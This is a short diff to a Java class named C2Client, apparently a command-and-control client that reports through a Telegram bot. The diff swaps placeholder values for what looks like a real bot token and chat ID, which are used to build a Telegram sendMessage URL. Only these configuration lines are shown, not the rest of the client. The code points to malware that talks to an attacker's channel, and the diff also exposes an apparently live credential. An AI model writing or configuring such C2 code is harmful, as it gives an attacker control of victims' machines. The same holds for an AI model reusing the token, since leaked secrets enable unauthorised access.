@@ -12,8 +12,8 @@ import java.nio.charset.StandardCharsets;
 public class C2Client {
 
     // replace with your bot token and chat id
-    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN";
-    private static final String CHAT_ID   = "YOUR_CHAT_ID";
+    private static final String BOT_TOKEN = "8743266929:AAEFSPl6NZwpXmjPT-tqmp6kWwF0MirVF1I";
+    private static final String CHAT_ID   = "7511153867";
     private static final String API_URL   =
         "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
 
